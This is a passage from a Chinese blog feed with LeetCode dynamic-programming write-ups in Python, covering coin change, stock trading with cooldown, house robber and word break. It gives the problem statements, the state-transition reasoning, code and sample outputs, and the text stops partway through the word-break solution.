      <link href="2020/12/22/LeetCode-C-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-322.%20%E9%9B%B6%E9%92%B1%E5%85%91%E6%8D%A2/"/>
      <url>2020/12/22/LeetCode-C-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-322.%20%E9%9B%B6%E9%92%B1%E5%85%91%E6%8D%A2/</url>
      
        <content type="html"><![CDATA[<p>dp、贪心、dfs</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定不同面额的硬币<code>coins</code> 和一个总金额 <code>amount</code>。编写一个函数来计算可以凑成总金额所需的最少的硬币个数。如果没有任何一种硬币组合能组成总金额，返回 <code>-1</code>。</p><p>你可以认为每种硬币的数量是无限的。</p><p>示例1：</p><pre><code>输入：coins = [1, 2, 5], amount = 11输出：3 解释：11 = 5 + 5 + 1</code></pre><p>示例2：</p><pre><code>输入：coins = [2], amount = 3输出：-1</code></pre><p>示例3：</p><pre><code>输入：coins = [1], amount = 0输出：0</code></pre><p>示例4：</p><pre><code>输入：coins = [1], amount = 1输出：1</code></pre><p>示例5：</p><pre><code>输入：coins = [1], amount = 2输出：2</code></pre><p>提示：$1 &lt;= coins.length &lt;= 12\<br>1 &lt;= coins[i] &lt;= 2^{31}- 1\<br>0 &lt;= amount &lt;= 10^4$</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="方法一-二维数组"><a href="#方法一-二维数组" class="headerlink" title="方法一:二维数组"></a>方法一:二维数组</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">coinChange</span><span class="params">(self, coins, amount)</span> -&gt; int:</span></span><br><span class="line">        <span class="keyword">if</span> amount &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> - <span class="number">1</span></span><br><span class="line">        dp = [[amount + <span class="number">1</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(len(coins) + <span class="number">1</span>)]</span><br><span class="line">              <span class="keyword">for</span> _ <span class="keyword">in</span> range(amount + <span class="number">1</span>)]</span><br><span class="line">        <span class="comment"># 初始化第一行为0，其他为最大值（也就是amount + 1）</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(coins) + <span class="number">1</span>):</span><br><span class="line">            dp[<span class="number">0</span>][j] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, amount + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, len(coins) + <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> i - coins[j - <span class="number">1</span>] &gt;= <span class="number">0</span>:</span><br><span class="line">                    dp[i][j] = min(</span><br><span class="line">                        dp[i][j - <span class="number">1</span>], dp[i - coins[j - <span class="number">1</span>]][j] + <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    dp[i][j] = dp[i][j - <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span> <span class="keyword">if</span> dp[<span class="number">-1</span>][<span class="number">-1</span>] == amount + <span class="number">1</span> <span class="keyword">else</span> dp[<span class="number">-1</span>][<span class="number">-1</span>]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=Solution()</span><br><span class="line">coins = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">5</span>]</span><br><span class="line">amount = <span class="number">11</span></span><br><span class="line">result =a.coinChange(coins,amount)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><pre><code>3</code></pre><p><strong>复杂度分析</strong></p><ul><li>时间复杂度：O(amonut∗len(coins))</li></ul><ul><li>空间复杂度：O(amount * len(coins))</li></ul><p><code>dp[i][j] 依赖于dp[i][j - 1]和 dp[i - coins[j - 1]][j] + 1)</code>这是一个优化的信号，我们可以将其优化到一维,具体见下方。</p><h3 id="方法二：一维数组"><a href="#方法二：一维数组" class="headerlink" title="方法二：一维数组"></a>方法二：一维数组</h3><h4 id="自上而下（动态规划）"><a href="#自上而下（动态规划）" class="headerlink" title="自上而下（动态规划）"></a>自上而下（动态规划）</h4><p><strong>转移方程</strong>：</p><ul><li><p>F(S)表示组成金额S的最少硬币数，最后一枚硬币值为C，则最优子结构为$$F(S)=F(S-C)+1$$</p></li><li><p>不能确定最后一枚硬币，故枚举每个硬币值$c_0,c_1,c_2,\cdots,c_{n-1}$，选择最小值。递推关系如下：<br>$$F(S)=min_{i=0,..,n-1}{F(S-c_i)+1}，S-c_i\geq0 \<br>F(S)=0,S=0\<br>F(S)=-1,n=0<br>$$</p></li></ul><h4 id="自下而上（动态规划）"><a href="#自下而上（动态规划）" class="headerlink" title="自下而上（动态规划）"></a>自下而上（动态规划）</h4><p><strong>思路分析</strong></p><ul><li>动态规划</li><li>子问题</li></ul><p>用 dp[i] 来表示组成 i 块钱，需要最少的硬币数，那么</p><ol><li>第 j 个硬币我可以选择不拿 这个时候， 硬币数 = dp[i]</li><li>第 j 个硬币我可以选择拿 这个时候， 硬币数 = dp[i - coins[j]] + 1</li><li>和背包问题不同， 硬币是可以拿任意个</li><li>对于每一个 dp[i] 我们都选择遍历一遍 coin， 不断更新 dp[i]</li></ol><p><strong>状态转移方程</strong></p><p>仍定义 F(i) 为组成金额 i 所需最少的硬币数量，假设在计算 F(i) 之前，我们已经计算出 F(0)-F(i-1) 的答案。 则 F(i) 对应的转移方程应为<br>$$F(i)=min_{j=0…n}F(i-c_j)+1$$</p><p><strong>示例</strong></p><p>coins = [1, 2, 3], amount = 6</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/201223leetcode01.png" width="500px"></p><p>在上图可看到：<br>$F(3)=min((F(3-c_1),F(3,c_2),F(3-c_3))+1$<br><br>$=min(F(3-1),F(3-2),F(3-3))+1$ <br><br>$=min(F(2),F(1),F(0))+1$<br><br>$=min(1,1,0)+1$<br><br>$=1$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">coinChange</span><span class="params">(self, coins, amount)</span> -&gt; int:</span></span><br><span class="line">        dp = [amount + <span class="number">1</span>] * (amount + <span class="number">1</span>)</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, amount + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(len(coins)):</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> i &gt;= coins[j]:</span><br><span class="line">                    dp[i] = min(dp[i], dp[i - coins[j]] + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span> <span class="keyword">if</span> dp[<span class="number">-1</span>] == amount + <span class="number">1</span> <span class="keyword">else</span> dp[<span class="number">-1</span>]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=Solution()</span><br><span class="line">coins = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">5</span>]</span><br><span class="line">amount = <span class="number">11</span></span><br><span class="line">result =a.coinChange(coins,amount)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><pre><code>3</code></pre><p><strong>复杂度</strong></p><p>时间复杂度：O(amonut * len(coins))</p><p>空间复杂度：O(amount)</p><h3 id="方法三：贪心-dfs"><a href="#方法三：贪心-dfs" class="headerlink" title="方法三：贪心 + dfs"></a>方法三：贪心 + dfs</h3><p><strong>思路分析</strong></p><ul><li>贪心</li></ul><ol><li>想要总硬币数最少，肯定是优先用大面值硬币，所以对 coins 按从大到小排序</li><li>先丢大硬币，再丢会超过总额时，就可以递归下一层丢的是稍小面值的硬币</li></ol><ul><li>乘法对加法的加速</li></ul><ol><li><p>优先丢大硬币进去尝试，也没必要一个一个丢，可以用乘法算一下最多能丢几个</p><pre><code>k = amount / coins[c_index] 计算最大能投几个amount - k * coins[c_index] 减去扔了 k 个硬币count + k 加 k 个硬币</code></pre></li><li><p>如果因为丢多了导致最后无法凑出总额，再回溯减少大硬币数量</p></li></ol><ul><li>最先找到的并不是最优解</li></ul><ol><li>注意不是现实中发行的硬币，面值组合规划合理，会有奇葩情况</li><li>考虑到有 [1,7,10] 这种用例，按照贪心思路 10 + 1 + 1 + 1 + 1 会比 7 + 7 更早找到</li><li>所以还是需要把所有情况都递归完</li></ol><ul><li>ans 疯狂剪枝</li></ul><ol><li>贪心虽然得不到最优解，但也不是没用的</li><li>我们快速算出一个贪心的 ans 之后，虽然还会有奇葩情况，但是绝大部分普通情况就可以疯狂剪枝了</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">coinChange</span><span class="params">(self, coins, amount)</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">coinChanging</span><span class="params">(coins, amount, c_index, count, ans)</span>:</span></span><br><span class="line">            <span class="keyword">if</span> amount == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> min(ans, count)</span><br><span class="line">            <span class="keyword">if</span> c_index == len(coins):</span><br><span class="line">                <span class="keyword">return</span> ans</span><br><span class="line">            k = amount // coins[c_index]</span><br><span class="line">            <span class="keyword">while</span> k &gt;= <span class="number">0</span> <span class="keyword">and</span> k + count &lt; ans:</span><br><span class="line">                ans = coinChanging(coins, amount - k * coins[c_index], c_index + <span class="number">1</span>, count + k, ans)</span><br><span class="line">                k -= <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> ans</span><br><span class="line">        <span class="keyword">if</span> amount == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        coins.sort(reverse=<span class="literal">True</span>)</span><br><span class="line">        ans = coinChanging(coins, amount, <span class="number">0</span>, <span class="number">0</span>, float(<span class="string">'inf'</span>))</span><br><span class="line">        <span class="keyword">return</span> ans <span class="keyword">if</span> ans != float(<span class="string">'inf'</span>) <span class="keyword">else</span> <span class="number">-1</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=Solution()</span><br><span class="line">coins = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">5</span>]</span><br><span class="line">amount = <span class="number">11</span></span><br><span class="line">result =a.coinChange(coins,amount)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><pre><code>3</code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据结构与算法 </tag>
            
            <tag> 动态规划 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构与算法】【LeetCode】【动态规划】309.最佳买卖股票时机含冷冻期</title>
      <link href="2020/12/20/LeetCode-C-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-309.%20%E6%9C%80%E4%BD%B3%E4%B9%B0%E5%8D%96%E8%82%A1%E7%A5%A8%E6%97%B6%E6%9C%BA%E5%90%AB%E5%86%B7%E5%86%BB%E6%9C%9F/"/>
      <url>2020/12/20/LeetCode-C-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-309.%20%E6%9C%80%E4%BD%B3%E4%B9%B0%E5%8D%96%E8%82%A1%E7%A5%A8%E6%97%B6%E6%9C%BA%E5%90%AB%E5%86%B7%E5%86%BB%E6%9C%9F/</url>
      
        <content type="html"><![CDATA[<p>dp组</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个整数数组，其中第 i 个元素代表了第 i 天的股票价格 。</p><p>设计一个算法计算出最大利润。在满足以下约束条件下，你可以尽可能地完成更多的交易（多次买卖一支股票）:</p><ul><li>你不能同时参与多笔交易（你必须在再次购买前出售掉之前的股票）。</li><li>卖出股票后，你无法在第二天买入股票 (即冷冻期为 1 天)。</li></ul><p>示例</p><pre><code>输入: [1,2,3,0,2]输出: 3 解释: 对应的交易状态为: [买入, 卖出, 冷冻期, 买入, 卖出]</code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>这是一道典型的 DP 问题， DP 问题的核心是找到状态和状态转移方程。</p><p>这道题目的状态似乎比我们常见的那种 DP 问题要多，这里的状态有 buy sell cooldown 三种， 我们可以用三个数组来表示这这三个状态，buy,sell, cooldown</p><ul><li>buy[i]表示第 i 天，且以 buy 结尾的最大利润</li><li>sell[i]表示第 i 天，且以 sell 结尾的最大利润</li><li>cooldown[i]表示第 i 天，且以 sell 结尾的最大利润</li></ul><p>我们思考一下，其实 cooldown 这个状态数组似乎没有什么用，因此 cooldown 不会对profit产生 任何影响。 我们可以进一步缩小为两种状态。</p><ul><li>buy[i] 表示第 i 天，且以 buy 或者 coolwown 结尾的最大利润</li><li>sell[i] 表示第 i 天，且以 sell 或者 cooldown 结尾的最大利润</li></ul><p>对应的状态转移方程如下：</p><pre><code>buy[i] = max(buy[i - 1], sell[i - 2] - prices[i])sell[i] =max(sell[i - 1], buy[i - 1] + prices[i])</code></pre><p>分析：buy[i]对应第 i 的 action 只能是 buy 或者 cooldown。</p><ul><li>如果是 cooldown，那么 profit 就是 buy[i - 1]</li><li>如果是 buy，那么就是前一个卖的profit减去今天买股票花的钱，即 sell[i -2] - prices[i]<blockquote><p>注意这里是 i - 2，不是 i-1 ，因为有 cooldown 的限制</p></blockquote></li></ul><p>sell[i]对应第 i 的 action 只能是 sell 或者 cooldown</p><ul><li>如果是 cooldown，那么 profit 就是 sell[i - 1]</li><li>如果是 sell，那么就是前一次买的时候获取的利润加上这次卖的钱，即 buy[i - 1] + prices[i]</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxProfit</span><span class="params">(self, prices)</span> -&gt; int:</span></span><br><span class="line">        <span class="keyword">if</span> prices==<span class="literal">None</span> <span class="keyword">or</span> len(prices)&lt;=<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        n=len(prices)</span><br><span class="line">        <span class="comment"># 定义状态变量</span></span><br><span class="line">        buy=[<span class="number">0</span>]*n</span><br><span class="line">        sell=[<span class="number">0</span>]*n</span><br><span class="line">        <span class="comment"># </span></span><br><span class="line">        buy[<span class="number">0</span>]=-prices[<span class="number">0</span>]</span><br><span class="line">        buy[<span class="number">1</span>]=max(-prices[<span class="number">0</span>],-prices[<span class="number">1</span>])</span><br><span class="line">        sell[<span class="number">0</span>]=<span class="number">0</span></span><br><span class="line">        sell[<span class="number">1</span>]=max(<span class="number">0</span>,prices[<span class="number">1</span>]-prices[<span class="number">0</span>])</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,n):</span><br><span class="line">            <span class="comment">#状态转移方程</span></span><br><span class="line">            <span class="comment"># 第i天只能是买或者cooldown</span></span><br><span class="line">            buy[i]=max(buy[i<span class="number">-1</span>],sell[i<span class="number">-2</span>]-prices[i])</span><br><span class="line">            </span><br><span class="line">            sell[i]=max(sell[i<span class="number">-1</span>],buy[i<span class="number">-1</span>]+prices[i])</span><br><span class="line">        <span class="keyword">return</span> max(buy[<span class="number">-1</span>],sell[<span class="number">-1</span>])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a= Solution()</span><br><span class="line">prices=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">2</span>]</span><br><span class="line">a.maxProfit(prices)</span><br></pre></td></tr></table></figure><pre><code>3</code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据结构与算法 </tag>
            
            <tag> 动态规划 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构与算法】【LeetCode】【动态规划】198.打家劫舍</title>
      <link href="2020/12/16/LeetCode-C-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-198.%20%E6%89%93%E5%AE%B6%E5%8A%AB%E8%88%8D/"/>
      <url>2020/12/16/LeetCode-C-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-198.%20%E6%89%93%E5%AE%B6%E5%8A%AB%E8%88%8D/</url>
      
        <content type="html"><![CDATA[<p>dp数组，滚动数组</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>你是一个专业的小偷，计划偷窃沿街的房屋。每间房内都藏有一定的现金，影响你偷窃的唯一制约因素就是相邻的房屋装有相互连通的防盗系统，<strong>如果两间相邻的房屋在同一晚上被小偷闯入，系统会自动报警</strong>。</p><p>给定一个代表每个房屋存放金额的非负整数数组，计算你 <strong>不触动警报装置的情况下 ，一夜之内能够偷窃到的最高金额</strong>。</p><p>示例1：</p><pre><code>输入：[1,2,3,1]输出：4解释：偷窃 1 号房屋 (金额 = 1) ，然后偷窃 3 号房屋 (金额 = 3)。     偷窃到的最高金额 = 1 + 3 = 4 。</code></pre><p>示例2：</p><pre><code>输入：[2,7,9,3,1]输出：12解释：偷窃 1 号房屋 (金额 = 2), 偷窃 3 号房屋 (金额 = 9)，接着偷窃 5 号房屋 (金额 = 1)。     偷窃到的最高金额 = 2 + 9 + 1 = 12 。</code></pre><p>提示：</p><pre><code>0 &lt;= nums.length &lt;= 1000 &lt;= nums[i] &lt;= 400</code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="方法一：动态规划-dp数组"><a href="#方法一：动态规划-dp数组" class="headerlink" title="方法一：动态规划 + dp数组"></a>方法一：动态规划 + dp数组</h3><p><strong>思路与算法分析</strong></p><ul><li>若只有一间房，则偷窃该房间</li><li>若有两间房，只能偷一间，故偷两者之间金额最高的</li><li>若房间数为$k(&gt;2)$<ul><li>偷窃第 k间房屋，那么就不能偷窃第 k-1 间房屋，偷窃总金额为前 k−2 间房屋的最高总金额与第 k间房屋的金额之和。</li><li>不偷窃第 k 间房屋，偷窃总金额为前 k−1 间房屋的最高总金额。</li></ul></li></ul><p>在两个选项中选择偷窃总金额较大的选项，该选项对应的偷窃总金额即为前 kk 间房屋能偷窃到的最高总金额。</p><p>用dp[i]表示前i间房屋能偷到的最高金额，则状态转移方程：$$dp[i]=max(dp[i-2)+nums[i],dp[i-1])$$<br>边界条件为$$ y= \begin{cases} dp[0]=nums[0],\quad 只有一间房屋，则偷窃该房屋 \ dp[1]=max(nums[0],nums[1]), \quad 只有两间房屋 \end{cases}  $$<br>最终的答案即为dp[n-1]，其中n是数组的长度</p><p><strong>复杂度分析</strong></p><ul><li>时间复杂度O(n)</li><li>空间复杂度O(n)</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">rob</span><span class="params">(self, nums)</span> -&gt; int:</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> len(nums)==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> len(nums)==<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> nums[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> len(nums)==<span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> max(nums[<span class="number">0</span>],nums[<span class="number">1</span>])</span><br><span class="line">        </span><br><span class="line">        n= len(nums)</span><br><span class="line">        dp=[<span class="number">0</span>]*len(nums)</span><br><span class="line">        dp[<span class="number">0</span>]=nums[<span class="number">0</span>]</span><br><span class="line">        dp[<span class="number">1</span>]=max(nums[<span class="number">0</span>],nums[<span class="number">1</span>])</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,n):</span><br><span class="line">            dp[i]=max(dp[i<span class="number">-2</span>]+nums[i],dp[i<span class="number">-1</span>])</span><br><span class="line">        <span class="keyword">return</span> dp[<span class="number">-1</span>]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nums=[<span class="number">2</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">1</span>]</span><br><span class="line">a=Solution()</span><br><span class="line">result=a.rob(nums)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><pre><code>12</code></pre><h3 id="方法二：滚动数组"><a href="#方法二：滚动数组" class="headerlink" title="方法二：滚动数组"></a>方法二：滚动数组</h3><p>通过两个单变量，时间复杂度为O(n)，空间复杂度为O(1)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">rob</span><span class="params">(self, nums)</span> -&gt; int:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> nums:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        size = len(nums)</span><br><span class="line">        <span class="keyword">if</span> size == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> nums[<span class="number">0</span>]</span><br><span class="line">        </span><br><span class="line">        first, second = nums[<span class="number">0</span>], max(nums[<span class="number">0</span>], nums[<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, size):</span><br><span class="line">            first, second = second, max(first + nums[i], second)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> second</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nums=[<span class="number">2</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">1</span>]</span><br><span class="line">a1=Solution()</span><br><span class="line">result=a1.rob(nums)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><pre><code>12</code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据结构与算法 </tag>
            
            <tag> 动态规划 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构与算法】【LeetCode】【动态规划】139.单词拆分</title>
      <link href="2020/12/15/LeetCode-C-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-139.%20%E5%8D%95%E8%AF%8D%E6%8B%86%E5%88%86/"/>
      <url>2020/12/15/LeetCode-C-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-139.%20%E5%8D%95%E8%AF%8D%E6%8B%86%E5%88%86/</url>
      
        <content type="html"><![CDATA[<p>dp数组，记忆化数组</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个<strong>非空</strong>字符串 s 和一个包含非空单词的列表 wordDict，判定 s 是否可以被空格拆分为一个或多个在字典中出现的单词。</p><p><strong>说明</strong>：</p><ul><li>拆分时可以重复使用字典中的单词。</li><li>你可以假设字典中没有重复的单词。</li></ul><p>示例 1：</p><pre><code>输入: s = &quot;leetcode&quot;, wordDict = [&quot;leet&quot;, &quot;code&quot;]输出: true解释: 返回 true 因为 &quot;leetcode&quot; 可以被拆分成 &quot;leet code&quot;。</code></pre><p>示例 2：</p><pre><code>输入: s = &quot;applepenapple&quot;, wordDict = [&quot;apple&quot;, &quot;pen&quot;]输出: true解释: 返回 true 因为 &quot;applepenapple&quot; 可以被拆分成 &quot;apple pen apple&quot;。     注意你可以重复使用字典中的单词。</code></pre><p>示例3：</p><pre><code>输入: s = &quot;catsandog&quot;, wordDict = [&quot;cats&quot;, &quot;dog&quot;, &quot;sand&quot;, &quot;and&quot;, &quot;cat&quot;]输出: false</code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="方法一：动态规划"><a href="#方法一：动态规划" class="headerlink" title="方法一：动态规划"></a>方法一：动态规划</h3><p><strong>思路和算法</strong></p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/201214leetcode01.png"><ol><li><p>初始化 $dp=[False,\cdots,False]$，长度为 n+1。n 为字符串长度。$dp[i]$ 表示 s 的前 i 位是否可以用 wordDict中的单词表示。</p></li><li><p>初始化 $dp[0]=True$，空字符可以被表示。</p></li><li><p>遍历字符串的所有子串，遍历开始索引 i，遍历区间$ [0,n)$：</p><ul><li>遍历结束索引 j，遍历区间 $[i+1,n+1)$：<ul><li>若 $dp[i]=True$且 $s[i,\cdots,j)$ 在 wordlist 中：$dp[j]=True$<blockquote><p>解释：$dp[i]=True$说明s 的前 i位可以用 wordDict 表示，则$ s[i,\cdots,j)$出现在 wordDict 中，说明 s 的前 j位可以表示。</p></blockquote></li></ul></li></ul></li><li><p>返回 $dp[n]$</p></li></ol><p><strong>复杂度分析</strong></p><ul><li>时间复杂度：$O(n^2)$</li><li>空间复杂度：$O(n)$</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wordBreak</span><span class="params">(self, s: str, wordDict)</span> -&gt; bool:</span></span><br><span class="line">        n=len(s)</span><br><span class="line">        dp=[<span class="literal">False</span>]*(n+<span class="number">1</span>) <span class="comment"># 初始化n+1个false</span></span><br><span class="line">        dp[<span class="number">0</span>]=<span class="literal">True</span>            <span class="comment"># 空字符可以被表示</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(i+<span 